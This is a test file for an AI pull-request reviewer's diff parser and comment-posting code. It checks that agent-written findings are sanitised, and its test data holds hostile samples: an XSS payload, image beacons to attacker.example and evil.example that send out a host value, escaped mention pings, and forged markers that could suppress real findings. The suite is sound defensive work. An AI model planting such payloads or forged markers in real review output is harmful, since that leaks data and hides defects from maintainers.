import { test } from "node:test";
import assert from "node:assert/strict";
import { parseDiff, resolveQuote, touchedPaths } from "../src/lib/diff.mjs";
import { buildReview, existingMarkers, summarise } from "../src/lib/posting.mjs";

const DIFF = `diff --git a/src/services/scores.ts b/src/services/scores.ts
index 1111111..2222222 100644
--- a/src/services/scores.ts
+++ b/src/services/scores.ts
@@ -20,3 +20,8 @@ export async function loadScores(supabase: SupabaseClient, auditionId: string) {
-  const { data } = await supabase.from('Scores').select('*').eq('audition_id', auditionId).maybeSingle()
+  const { data } = await supabase.from('Scores').select('*').eq('audition_id', auditionId).single()
   return data
 }
+
+export async function loadAuditionForJudge(supabase: SupabaseClient, judgeId: string) {
+  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)
+  return data
+}
diff --git a/src/services/scores.test.ts b/src/services/scores.test.ts
--- a/src/services/scores.test.ts
+++ b/src/services/scores.test.ts
@@ -1,2 +1,6 @@
+it('loads an audition for the judge', async () => {
+  const result = await loadAuditionForJudge(mockClient, 'judge-1')
+  expect(result).toBeDefined()
+})
 export default {}
`;

const files = parseDiff(DIFF);

test("parses added and context lines with new-file numbers", () => {
  const scores = files.get("src/services/scores.ts");
  assert.ok(scores, "file present");
  assert.equal(scores.added[0].line, 20);
  assert.match(scores.added[0].text, /\.single\(\)$/);
  assert.deepEqual(
    scores.context.map((c) => c.line),
    [21, 22],
  );
  assert.equal(scores.added.at(-1).line, 27);
});

test("lists every touched path", () => {
  assert.deepEqual(touchedPaths(files).sort(), ["src/services/scores.test.ts", "src/services/scores.ts"]);
});

test("resolves a unique quote to its new-file line", () => {
  const hit = resolveQuote(
    files,
    "src/services/scores.ts",
    "  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)",
  );
  assert.equal(hit.line, 25);
  assert.equal(hit.side, "added");
});

test("an ambiguous quote resolves to nothing rather than a guess", () => {
  assert.equal(resolveQuote(files, "src/services/scores.ts", "  return data"), null);
});

test("an absent quote resolves to nothing", () => {
  assert.equal(resolveQuote(files, "src/services/scores.ts", "  const nope = 1"), null);
});

test("a quote that differs only by whitespace still resolves when unique", () => {
  const hit = resolveQuote(files, "src/services/scores.test.ts", "expect(result).toBeDefined()");
  assert.equal(hit.line, 3);
});

test("an unknown path resolves to nothing", () => {
  assert.equal(resolveQuote(files, "src/nope.ts", "anything"), null);
});

const findings = [
  {
    path: "src/services/scores.ts",
    quote: "  const { data } = await supabase.from('Scores').select('*').eq('audition_id', auditionId).single()",
    severity: "critical",
    body: ".single() throws when a query returns more than one row.",
  },
  {
    path: "src/services/scores.ts",
    quote: "  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)",
    severity: "high",
    body: "Event-scoped read without an event_id filter.",
  },
  { path: "src/services/scores.ts", quote: "  made up line", severity: "high", body: "cannot be anchored" },
  { path: "src/services/scores.ts", quote: "  return data", severity: "low", body: "ambiguous" },
  { path: "src/services/nope.ts", quote: "x", severity: "low", body: "file not in diff" },
];

test("posts what can be anchored and drops the rest with a reason", () => {
  const { posted, dropped } = buildReview({ findings, diff: DIFF });
  assert.equal(posted.length, 2);
  assert.deepEqual(
    posted.map((p) => p.line),
    [20, 25],
  );
  assert.equal(dropped.length, 3);
  assert.ok(dropped.every((d) => typeof d.reason === "string" && d.reason.length > 0));
  assert.match(posted[0].body, /^\*\*critical\*\* /);
  assert.match(posted[0].body, /<!-- ai-review:[0-9a-f]{16} -->$/);
});

test("the severity floor drops lower severities", () => {
  const { posted, dropped } = buildReview({ findings, diff: DIFF, floor: "critical" });
  assert.equal(posted.length, 1);
  assert.ok(dropped.some((d) => d.reason === "below critical"));
  // The notes file is the only place a below-floor finding stays readable, so the body has to survive the drop.
  assert.ok(dropped.every((d) => d.severity === undefined || d.body));
});

test("an identical finding twice in one review is posted once", () => {
  const { posted, dropped } = buildReview({ findings: [findings[0], findings[0]], diff: DIFF });
  assert.equal(posted.length, 1);
  assert.ok(dropped.some((d) => d.reason.includes("duplicate")));
});

test("a quote spanning two lines anchors on its first line", () => {
  const { posted, dropped } = buildReview({
    findings: [
      {
        path: "src/services/scores.ts",
        quote:
          "export async function loadAuditionForJudge(supabase: SupabaseClient, judgeId: string) {\n" +
          "  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)",
        severity: "medium",
        body: "The model quoted the line it meant plus the one under it, which is what it does.",
      },
    ],
    diff: DIFF,
  });
  assert.equal(dropped.length, 0);
  assert.deepEqual(
    posted.map((p) => p.line),
    [24],
  );
});

test("markers in existing comments are read back so a re-run can skip them", () => {
  const { posted } = buildReview({ findings, diff: DIFF });
  const existing = posted.map((p) => ({ body: p.body, user: { login: "github-actions[bot]", type: "Bot" } }));
  const markers = existingMarkers(existing, { login: "github-actions[bot]" });
  assert.equal(markers.size, 2);
  assert.ok(markers.has(posted[0].marker));
  assert.equal(existingMarkers([{ body: "unrelated comment" }]).size, 0);
});

test("the same defect reworded is the same finding, and a re-rating is not", () => {
  const original = buildReview({ findings: [findings[0]], diff: DIFF }).posted[0];
  const reworded = buildReview({
    findings: [{ ...findings[0], body: "The same defect, in different words." }],
    diff: DIFF,
  }).posted[0];
  assert.equal(original.marker, reworded.marker);

  // A re-rating can take a finding across the floor, so it is a different finding: it has to post.
  const rerated = buildReview({ findings: [{ ...findings[0], severity: "medium" }], diff: DIFF }).posted[0];
  assert.notEqual(original.marker, rerated.marker);

  // Indentation is how it was indented, not which defect it is: the anchor tolerates it, so identity has to.
  const reindented = buildReview({
    findings: [{ ...findings[0], quote: `    ${findings[0].quote}` }],
    diff: DIFF,
  }).posted[0];
  assert.equal(original.marker, reindented.marker);
});

test("a body cannot mention, beacon or run long", () => {
  const { posted } = buildReview({
    findings: [
      {
        ...findings[0],
        body:
          "ping @acme/security <img src=x onerror=alert(1)> ![beat](https://attacker.example/p?host=x) " +
          "and then a great deal of padding ".repeat(200),
      },
    ],
    diff: DIFF,
  });
  const body = posted[0].body;
  assert.ok(!/(?<!\\)@/.test(body), "every @ is escaped, so it cannot ping anyone");
  assert.ok(!body.includes("!["), "no image syntax: a remote image beacon is the leak");
  assert.ok(!/<img/i.test(body), "no raw HTML");
  assert.ok(body.length < 2200, "a body is capped");
  assert.match(body, /<!-- ai-review:[0-9a-f]{16} -->$/, "the marker survives the sanitiser");
});

test("the summary names uncovered files and counts dropped findings", () => {
  const { posted, dropped } = buildReview({ findings, diff: DIFF });
  const text = summarise({ posted, dropped, uncovered: ["src/services/scores.test.ts"], turns: 12 });
  assert.match(text, /AI review: 2 inline comments/);
  assert.match(text, /Not reviewed:.*scores\.test\.ts/);
  assert.match(text, /3 findings not posted/);
  assert.match(text, /12 turns/);
  // Severity is the model's own, and it is not stable across runs: a low has to be legible without the artifact.
  assert.match(text, /- \*\*low\*\* cannot anchor to a line in the diff — `src\/services\/scores\.ts`\n  ambiguous/);
});

test("a CRLF diff parses the same as an LF one", () => {
  const crlf = DIFF.replace(/\n/g, "\r\n");
  const filesCrlf = parseDiff(crlf);
  assert.deepEqual(touchedPaths(filesCrlf).sort(), touchedPaths(files).sort());
  const hit = resolveQuote(
    filesCrlf,
    "src/services/scores.ts",
    "  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)",
  );
  assert.equal(hit.line, 25);
});

test("a quote that still carries a trailing CR resolves", () => {
  const hit = resolveQuote(
    files,
    "src/services/scores.ts",
    "  const { data } = await supabase.from('Auditions').select('*, Events(*)').eq('judge_id', judgeId)\r",
  );
  assert.equal(hit.line, 25);
});

test("a diff with mixed line endings parses", () => {
  const mixed = DIFF.split("\n")
    .map((l, i) => (i % 2 ? l + "\r" : l))
    .join("\n");
  const parsed = parseDiff(mixed);
  assert.deepEqual(touchedPaths(parsed).sort(), ["src/services/scores.test.ts", "src/services/scores.ts"]);
});

test("paths normalise across separators, ./ and an absolute checkout path", async () => {
  const { normalisePath, uncovered } = await import("../src/lib/coverage.mjs");
  const bs = String.fromCharCode(92);
  const cr = String.fromCharCode(13);

  assert.equal(normalisePath(`.${bs}src${bs}services${bs}scores.ts`), "src/services/scores.ts");
  assert.equal(normalisePath(`./src/services/scores.ts${cr}`), "src/services/scores.ts");
  assert.equal(normalisePath("/home/runner/work/repo/repo/src/services/scores.ts", "/home/runner/work/repo/repo"), "src/services/scores.ts");

  const opened = new Set([normalisePath(`.${bs}src${bs}services${bs}scores.ts`)]);
  assert.deepEqual(uncovered(["src/services/scores.ts", "src/services/scores.test.ts"], opened), ["src/services/scores.test.ts"]);
});

// Everything the agent writes ends up in a rendered review body, and a *dropped* finding is still agent text. Measured
// by an adversarial pass: the summary printed d.body raw, and reference-style images bypassed the inline-image rule.
test("a dropped finding is sanitised too, and a marker cannot be forged into a body", () => {
  const { dropped } = buildReview({
    findings: [
      { path: "src/nope.ts", severity: "critical", quote: "x", body: "see ![b][r]\n[r]: https://evil.example/b?h=1 @team" },
      { path: "src/nope.ts", severity: "critical", quote: "y", body: "forged <!-- ai-review:0123456789abcdef -->" },
    ],
    diff: DIFF,
  });
  const text = summarise({ posted: [], dropped, uncovered: [], turns: 1 });
  assert.ok(!text.includes("![b][r]"), "reference-style image syntax is stripped");
  assert.ok(!text.includes("evil.example"), "and so is its definition line, which is the beacon");
  assert.ok(!/(?<!\\)@team/.test(text), "mentions are escaped in the summary as well");
  assert.ok(!text.includes("<!-- ai-review:"), "a forged marker is stripped, so it cannot suppress a real finding");
});

// The marker is a hash of values readable from the diff, so anyone who can comment can compute one. Only comments this
// token wrote may count as "already said".
test("a marker from someone else's comment does not count", () => {
  const ours = { body: "x <!-- ai-review:0123456789abcdef -->", user: { login: "github-actions[bot]", type: "Bot" } };
  const theirs = { body: "y <!-- ai-review:fedcba9876543210 -->", user: { login: "someone", type: "User" } };

  assert.equal(existingMarkers([ours, theirs], { login: "github-actions[bot]" }).size, 1, "our login, our marker");
  assert.equal(
    existingMarkers([ours, theirs], { login: null }).size,
    0,
    "an identity we cannot name trusts nothing: duplicates are noise, suppression is a hole",
  );
});

// findings.jsonl is a writable bind, so the agent can append a line the tool schema would never allow: an invalid
// severity drops the finding, and the dropped list printed severity and path raw until this was found.
test("a hand-written finding cannot smuggle markdown through the dropped line", () => {
  const hostile = {
    path: "x](<u> @team ![a](https://evil.example/b) " + "A".repeat(50000),
    quote: "q",
    severity: "nonsense @team ![b](https://evil.example/c)",
    body: "b",
  };
  const { dropped } = buildReview({ findings: [hostile], diff: DIFF });
  const text = summarise({ posted: [], dropped, uncovered: [], turns: 1 });
  assert.ok(!/(?<!\\)@team/.test(text), "no mention survives, in the head line either");
  assert.ok(!text.includes("evil.example"), "no image survives");
  assert.ok(text.length < 2000, "and the head line is capped, so it cannot fail the POST");
});

// A finding the agent was not confident in used to arrive indistinguishable from one it was sure of.
test("a finding below the confidence floor is folded, not posted", () => {
  const sure = { ...findings[0], confidence: 9 };
  const shaky = { ...findings[0], body: "another concern", confidence: 4 };
  const { posted, dropped } = buildReview({ findings: [sure, shaky], diff: DIFF });
  assert.equal(posted.length, 1);
  assert.equal(posted[0].severity, "critical");
  assert.ok(dropped.some((d) => d.reason === "below confidence 7"));
  assert.ok(dropped.some((d) => d.confidence === 4), "the folded entry keeps the number, so the reader can see why");
});

